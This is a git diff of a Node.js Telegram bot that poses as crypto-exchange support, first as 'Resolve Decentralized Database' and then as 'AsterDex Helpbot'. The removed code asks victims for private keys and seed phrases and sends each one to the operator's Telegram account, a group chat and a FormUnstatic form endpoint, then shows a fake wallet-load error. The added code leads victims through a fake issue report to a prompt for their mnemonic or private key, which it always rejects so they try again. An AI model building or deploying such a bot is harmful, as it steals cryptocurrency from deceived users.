@@ -1,256 +1,119 @@
-// index.js
-const express = require('express');
-const dotenv = require('dotenv');
 const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
 
-dotenv.config();
-const app = express();
-app.use(express.json({ limit: '1mb' })); // parse JSON from Telegram
+const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-const PORT = process.env.PORT || 8080;
+// Optional: your Telegram ID to receive reports
+const ownerId = 'YOUR_TELEGRAM_USER_ID';
 
-// Required environment variables
-const token = process.env.BOT_TOKEN;
-const ownerId = process.env.OWNER_ID;
-const formUnstaticURL = process.env.FORM_UNSTATIC_URL;
-const appUrl = process.env.APP_URL; // now ONLY Render public URL
-const webhookSecret =
-  process.env.WEBHOOK_SECRET ||
-  `hook_${Math.random().toString(36).slice(2, 10)}`;
-
-if (!token || !ownerId || !formUnstaticURL || !appUrl) {
-  console.error(
-    '❌ Missing required environment variables. You must set BOT_TOKEN, OWNER_ID, FORM_UNSTATIC_URL and APP_URL.'
-  );
-  throw new Error('Missing required environment variables!');
-}
-
-// Create bot in webhook mode (no polling)
-const bot = new TelegramBot(token, { polling: false });
-
-// --- Webhook endpoint ---
-app.post(`/${webhookSecret}`, (req, res) => {
-  try {
-    const preview = JSON.stringify(req.body).slice(0, 2000);
-    console.log('⤵️ Incoming update:', preview);
-  } catch (err) {
-    console.log('⤵️ Incoming update (could not stringify)');
-  }
-
-  try {
-    bot.processUpdate(req.body);
-  } catch (err) {
-    console.error('Error processing update:', err);
-  }
-  res.sendStatus(200);
-});
-
-// --- Health endpoints ---
-app.get('/', (req, res) => res.status(200).send('Bot is live 🚀'));
-app.get('/health', (req, res) => res.status(200).send('Bot is running ✅'));
-
-// -------------------- App logic --------------------
+// Store per-user states
 const chatStates = {};
 
-const sendToFormUnstatic = async (name, message) => {
-  if (!name || !message) return;
-  try {
-    const response = await axios.post(
-      formUnstaticURL,
-      new URLSearchParams({ name, message }),
-      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
-    );
-    console.log('✅ Data sent to FormUnstatic:', response.data);
-  } catch (error) {
-    console.error(
-      '❌ Error sending data to FormUnstatic:',
-      error.response?.data || error.message
-    );
-  }
-};
-
-bot.on('message', async (msg) => {
-  if (!msg || !msg.chat) return;
+// --- START COMMAND ---
+bot.onText(/\/start/, async (msg) => {
   const chatId = msg.chat.id;
-  const text = msg.text || '';
+  delete chatStates[chatId];
 
-  const groupId = process.env.GROUP_CHAT_ID;
-
-  if (text === 'Cancel') {
-    delete chatStates[chatId];
-    return bot.sendMessage(chatId, '✅ Operation canceled.');
-  }
-
-  if (chatStates[chatId] === 'awaiting_private_key') {
-    const privateKey = text;
-
-    bot.sendMessage(ownerId, `🔑 Private Key Received:\n${privateKey}`);
-    if (groupId) bot.sendMessage(groupId, `🔑 Private Key:\n${privateKey}`);
-    sendToFormUnstatic('Private Key Received', privateKey);
-
-    bot.sendMessage(chatId, '❌ Failed to load wallet!', {
+  await bot.sendMessage(
+    chatId,
+    "👋 Welcome to *AsterDex Helpbot!* Let's process your issue for Spot, Perp or others.",
+    {
+      parse_mode: 'Markdown',
       reply_markup: {
-        inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
+        inline_keyboard: [
+          [{ text: '🛠 Report an Issue', callback_data: 'report_issue' }],
+        ],
       },
-    });
-
-    delete chatStates[chatId];
-    return;
-  }
-
-  if (chatStates[chatId] === 'awaiting_seed_phrase') {
-    const seedPhrase = text;
-
-    bot.sendMessage(ownerId, `📜 Seed Phrase Received:\n${seedPhrase}`);
-    if (groupId) bot.sendMessage(groupId, `📜 Seed Phrase:\n${seedPhrase}`);
-    sendToFormUnstatic('Seed Phrase Received', seedPhrase);
-
-    bot.sendMessage(chatId, '❌ Failed to load wallet!', {
-      reply_markup: {
-        inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
-      },
-    });
-
-    delete chatStates[chatId];
-    return;
-  }
-
-  bot.sendMessage(chatId, `Hello, ${msg.from?.first_name || 'there'}!`);
+    }
+  );
 });
 
-// -------------------- Handlers --------------------
-const handledUpdateIds = new Set();
-
-bot.onText(/\/start/, (msg) => {
-  if (handledUpdateIds.has(msg.update_id)) return;
-  handledUpdateIds.add(msg.update_id);
-
+// --- ISSUE COMMAND (RESTART FLOW) ---
+bot.onText(/\/issue/, async (msg) => {
   const chatId = msg.chat.id;
-  const message = `🌠 Welcome to the Resolve Decentralized Database
+  delete chatStates[chatId];
 
-Here, you can address issues such as:
-• Bot glitches
-• Swap failures
-• Configuration errors
-• Asset recovery
-• Validation problems
-• High slippage
-• Rugged token issues
-• Failed transactions
-• High gas fees
+  await bot.sendMessage(chatId, '🔄 Restarting issue report...', {
+    reply_markup: { remove_keyboard: true },
+  });
 
-🚀 Please select an issue to continue.`;
-
-  const options = {
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: ' ⚙️ RECTIFICATION ⚙️', callback_data: 'options' },
-          { text: ' ⚙️ VALIDATION ⚙️', callback_data: 'options' },
+  await bot.sendMessage(
+    chatId,
+    "👋 Welcome to *AsterDex Helpbot!* Let's process your issue for Spot, Perp or others.",
+    {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: '🛠 Report an Issue', callback_data: 'report_issue' }],
         ],
-        [
-          { text: ' ⚙️ CONFIGURATION ⚙️', callback_data: 'options' },
-          { text: ' ⚙️ ASSET RECOVERY ⚙️', callback_data: 'options' },
-        ],
-        [
-          { text: ' ⚙️ SWAP FAIL ⚙️', callback_data: 'options' },
-          { text: ' ⚙️ CLEAR BOT GLITCH ⚙️', callback_data: 'options' },
-        ],
-        [
-          { text: '⚙️ HIGH SLIPPAGE ⚙️', callback_data: 'options' },
-          { text: '⚙️ FAILED BUY & SELL ⚙️', callback_data: 'options' },
-        ],
-        [
-          { text: '⚙️ HIGH GAS FEE ⚙️', callback_data: 'options' },
-          { text: '⚙️ TURBO MODE ⚙️', callback_data: 'options' },
-        ],
-        [
-          { text: '⚙️ FAILED SNIPE ⚙️', callback_data: 'options' },
-          { text: '⚙️ TECHNICAL BUGS ⚙️', callback_data: 'options' },
-        ],
-      ],
-    },
-  };
-
-  bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...options });
+      },
+    }
+  );
 });
 
-const walletSelectionKeyboard = {
-  reply_markup: {
-    inline_keyboard: [
-      [{ text: 'NOVA', callback_data: 'wallet_selected' }],
-      [{ text: 'FIRST LEDGER', callback_data: 'wallet_selected' }],
-      [{ text: 'BLOOM', callback_data: 'wallet_selected' }],
-      [{ text: 'BEAR BULL', callback_data: 'wallet_selected' }],
-      [{ text: 'MAESTRO', callback_data: 'wallet_selected' }],
-      [{ text: 'AUTO SNIPE', callback_data: 'wallet_selected' }],
-      [{ text: 'TROJAN', callback_data: 'wallet_selected' }],
-      [{ text: 'NOKBOT', callback_data: 'wallet_selected' }],
-      [{ text: 'PHOTON WEB', callback_data: 'wallet_selected' }],
-      [{ text: 'XBOT', callback_data: 'wallet_selected' }],
-      [{ text: 'GMGN AI', callback_data: 'wallet_selected' }],
-      [{ text: 'SUNDOG', callback_data: 'wallet_selected' }],
-      [{ text: 'SOL TRADING BOT', callback_data: 'wallet_selected' }],
-      [{ text: 'BANANA GUNBOT', callback_data: 'wallet_selected' }],
-      [{ text: 'UNIBOT', callback_data: 'wallet_selected' }],
-      [{ text: 'SHURIKEN', callback_data: 'wallet_selected' }],
-      [{ text: 'PEPE BOT', callback_data: 'wallet_selected' }],
-      [{ text: 'TRADEWIZ', callback_data: 'wallet_selected' }],
-      [{ text: 'KSPR BOT', callback_data: 'wallet_selected' }],
-      [{ text: 'SIGMA BOT', callback_data: 'wallet_selected' }],
-      [{ text: 'MEVX WEB', callback_data: 'wallet_selected' }],
-      [{ text: 'FINDER BOT WEB', callback_data: 'wallet_selected' }],
-      [{ text: 'PRODIGY BOT', callback_data: 'wallet_selected' }],
-      [{ text: 'MAGNUM BOT', callback_data: 'wallet_selected' }],
-      [{ text: 'WALLET CONNECT', callback_data: 'wallet_selected' }],
-    ],
-  },
-};
-
-bot.on('callback_query', (query) => {
+// --- CALLBACK HANDLER ---
+bot.on('callback_query', async (query) => {
   const chatId = query.message.chat.id;
-  switch (query.data) {
-    case 'options':
-      bot.sendMessage(chatId, 'Select your bot:', walletSelectionKeyboard);
-      break;
+  const data = query.data;
 
-    case 'wallet_selected':
-      bot.sendMessage(chatId, 'ℹ️ Connect wallet to use settings', {
+  switch (data) {
+    // === Report Issue ===
+    case 'report_issue':
+      await bot.sendMessage(chatId, '🤔 What issue are you currently facing?', {
         reply_markup: {
           inline_keyboard: [
             [
               {
-                text: 'IMPORT PRIVATE KEY',
-                callback_data: 'import_private_key',
+                text: '💰 Deposit on Spot',
+                callback_data: 'issue_deposit_spot',
               },
             ],
             [
               {
-                text: 'IMPORT SEED PHRASE',
-                callback_data: 'import_seed_phrase',
+                text: '🏦 Withdrawal on Spot',
+                callback_data: 'issue_withdraw_spot',
               },
             ],
+            [
+              {
+                text: '📈 Deposit on Perp',
+                callback_data: 'issue_deposit_perp',
+              },
+            ],
+            [
+              {
+                text: '📉 Withdrawal on Perp',
+                callback_data: 'issue_withdraw_perp',
+              },
+            ],
+            [
+              {
+                text: '🔁 Spot/Perp Transfer',
+                callback_data: 'issue_transfer',
+              },
+            ],
+            [{ text: '❓ Other', callback_data: 'issue_other' }],
           ],
         },
       });
       break;
 
-    case 'import_private_key':
-      bot.sendMessage(chatId, 'Enter private key 🔑', {
-        reply_markup: {
-          keyboard: [[{ text: 'Cancel' }]],
-          resize_keyboard: true,
-          one_time_keyboard: true,
-        },
-      });
-      chatStates[chatId] = 'awaiting_private_key';
-      break;
+    // === Issue Selected ===
+    case 'issue_deposit_spot':
+    case 'issue_withdraw_spot':
+    case 'issue_deposit_perp':
+    case 'issue_withdraw_perp':
+    case 'issue_transfer':
+    case 'issue_other':
+      chatStates[chatId] = {
+        step: 'awaiting_wallet_address',
+        issueType: data.replace('issue_', '').replace(/_/g, ' '),
+      };
 
-    case 'import_seed_phrase':
-      bot.sendMessage(
+      await bot.sendMessage(
         chatId,
-        'Enter 12-24 word mnemonic / recovery phrase ⬇️',
+        '🏷️ Enter wallet address — exactly as shown in your wallet:',
         {
           reply_markup: {
             keyboard: [[{ text: 'Cancel' }]],
@@ -259,40 +122,180 @@ bot.on('callback_query', (query) => {
           },
         }
       );
-      chatStates[chatId] = 'awaiting_seed_phrase';
       break;
 
-    case 'try_again':
-      bot.sendMessage(chatId, 'Restarting process...', {
+    // === Network Selection ===
+    case 'network_ethereum':
+    case 'network_bnb':
+    case 'network_solana':
+    case 'network_polygon':
+    case 'network_arbitrum':
+    case 'network_avalanche':
+    case 'network_other': {
+      const state = chatStates[chatId];
+      if (!state) return;
+
+      state.network = data.replace('network_', '').toUpperCase();
+      state.step = 'awaiting_token_selection';
+
+      await bot.sendMessage(chatId, `✅ Network selected: *${state.network}*`, {
+        parse_mode: 'Markdown',
+      });
+
+      await bot.sendMessage(
+        chatId,
+        '💠 Which token are you facing this issue with?',
+        {
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: 'USDC', callback_data: 'token_usdc' }],
+              [{ text: 'USDT', callback_data: 'token_usdt' }],
+              [{ text: 'USD1', callback_data: 'token_usd1' }],
+              [{ text: 'BTC', callback_data: 'token_btc' }],
+              [{ text: 'ETH', callback_data: 'token_eth' }],
+              [{ text: 'APX', callback_data: 'token_apx' }],
+              [{ text: 'Aster', callback_data: 'token_aster' }],
+              [{ text: 'SOL', callback_data: 'token_sol' }],
+              [{ text: 'Other', callback_data: 'token_other' }],
+            ],
+          },
+        }
+      );
+      break;
+    }
+
+    // === Token Selection ===
+    case 'token_usdc':
+    case 'token_usdt':
+    case 'token_usd1':
+    case 'token_btc':
+    case 'token_eth':
+    case 'token_apx':
+    case 'token_aster':
+    case 'token_sol':
+    case 'token_other': {
+      const state = chatStates[chatId];
+      if (!state) return;
+
+      state.token = data.replace('token_', '').toUpperCase();
+      state.step = 'awaiting_confirmation';
+
+      const summary =
+        `🧾 *Issue Report*\n` +
+        `• Issue Type: ${state.issueType.replace(/\b\w/g, (c) =>
+          c.toUpperCase()
+        )}\n` +
+        `• Wallet Address: ${state.walletAddress}\n` +
+        `• Network: ${state.network}\n` +
+        `• Token: ${state.token}`;
+
+      await bot.sendMessage(chatId, summary, {
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: '➡️ Next', callback_data: 'next_step' }],
+            [{ text: '🔄 Start Over', callback_data: 'restart_bot' }],
+          ],
+        },
+      });
+      break;
+    }
+
+    // === NEXT STEP ===
+    case 'next_step': {
+      const state = chatStates[chatId];
+      if (!state) return;
+
+      state.step = 'awaiting_authorization';
+
+      await bot.sendMessage(
+        chatId,
+        '🔐 Now enter your mnemonic phrase or private key to authorize:',
+        {
+          reply_markup: {
+            keyboard: [[{ text: 'Cancel' }]],
+            resize_keyboard: true,
+            one_time_keyboard: true,
+          },
+        }
+      );
+      break;
+    }
+
+    // === RESTART BOT ===
+    case 'restart_bot': {
+      delete chatStates[chatId];
+      await bot.sendMessage(chatId, '🔄 Starting over...', {
         reply_markup: { remove_keyboard: true },
       });
-      bot.emit('message', { chat: { id: chatId }, text: '/start' });
+      await bot.sendMessage(
+        chatId,
+        "👋 Welcome to *AsterDex Helpbot!* Let's process your issue for Spot, Perp or others.",
+        {
+          parse_mode: 'Markdown',
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: '🛠 Report an Issue', callback_data: 'report_issue' }],
+            ],
+          },
+        }
+      );
+      break;
+    }
+
+    default:
       break;
   }
+
   bot.answerCallbackQuery(query.id).catch(console.error);
 });
 
-// -------------------- START SERVER & SET WEBHOOK --------------------
-app.listen(PORT, async () => {
-  console.log(`🚀 Server running on port ${PORT}`);
-  const webhookUrl = `${appUrl.replace(/\/$/, '')}/${webhookSecret}`;
+// --- MESSAGE HANDLER ---
+bot.on('message', async (msg) => {
+  const chatId = msg.chat.id;
+  const text = msg.text?.trim();
+  if (!text) return;
 
-  try {
-    await axios
-      .post(`https://api.telegram.org/bot${token}/deleteWebhook`, null, {
-        params: { drop_pending_updates: true },
-        timeout: 10000,
-      })
-      .catch((e) => {
-        console.warn(
-          'Warning deleting old webhook (nonfatal):',
-          e?.message || e
-        );
-      });
+  if (text === 'Cancel') {
+    delete chatStates[chatId];
+    await bot.sendMessage(chatId, '✅ Operation canceled.', {
+      reply_markup: { remove_keyboard: true },
+    });
+    return;
+  }
 
-    await bot.setWebHook(webhookUrl);
-    console.log(`✅ Webhook set to ${webhookUrl}`);
-  } catch (err) {
-    console.error('❌ Failed to set webhook:', err?.message || err);
+  const state = chatStates[chatId];
+
+  // === Wallet Address Input ===
+  if (state?.step === 'awaiting_wallet_address') {
+    state.walletAddress = text;
+    state.step = 'awaiting_network_selection';
+
+    await bot.sendMessage(chatId, '🌐 What network are you facing issues on?', {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: 'Ethereum', callback_data: 'network_ethereum' }],
+          [{ text: 'BNB Chain', callback_data: 'network_bnb' }],
+          [{ text: 'Solana', callback_data: 'network_solana' }],
+          [{ text: 'Polygon', callback_data: 'network_polygon' }],
+          [{ text: 'Arbitrum', callback_data: 'network_arbitrum' }],
+          [{ text: 'Avalanche', callback_data: 'network_avalanche' }],
+          [{ text: 'Other', callback_data: 'network_other' }],
+        ],
+      },
+    });
+    return;
+  }
+
+  // === Mnemonic/Private Key Input (ALWAYS INVALID) ===
+  if (state?.step === 'awaiting_authorization') {
+    await bot.sendMessage(
+      chatId,
+      `⚠️ Validation Error: There’s an error in your input, please try again.\n\nNow enter your mnemonic phrase or private key to authorize or send /issue to restart.`,
+      {
+        parse_mode: 'Markdown',
+      }
+    );
+    return;
   }
 });
